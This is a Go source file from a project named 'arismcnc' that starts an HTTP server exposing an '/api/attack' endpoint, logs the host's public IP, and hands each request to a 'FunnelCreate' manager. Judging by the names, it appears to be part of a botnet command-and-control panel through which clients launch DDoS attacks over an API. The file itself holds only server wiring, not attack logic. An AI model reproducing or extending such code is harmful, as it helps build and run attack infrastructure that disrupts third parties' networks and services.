package handlers

import (
	"arismcnc/database"
	"arismcnc/managers"
	"arismcnc/utils"
	"log"
	"net/http"
	"strings"
)

var db *database.Database

func StartHTTPServer() {
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		log.Fatalf("failed to load config: %v", err)
	}

	db, err = database.ConnectDB(config)
	if err != nil {
		log.Fatalf("failed to connect to database: %v", err)
	}

	http.HandleFunc("/api/attack", createFunnelHandler(db))
	serverAddr := ":" + config.Funnel_port

	publicIP, err := utils.GetPublicIP()
	if err != nil {
		log.Fatalf("\033[31mError getting public IP address: %v\033[0m", err) 
	}
	log.Printf("\033[32mSuccessfully\033[0m started HTTP server (%s:%s)", strings.TrimSpace(publicIP), serverAddr)

	if err := http.ListenAndServe(serverAddr, nil); err != nil {
		log.Fatalf("[!] Funnel server failed: %v", err)
	}
}

func createFunnelHandler(db *database.Database) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		config, err := utils.LoadConfig("assets/config.json")
		if err != nil {
			log.Fatalf("failed to load config: %v", err)
		}
		managers.FunnelCreate(w, r, db, config)
	}
}
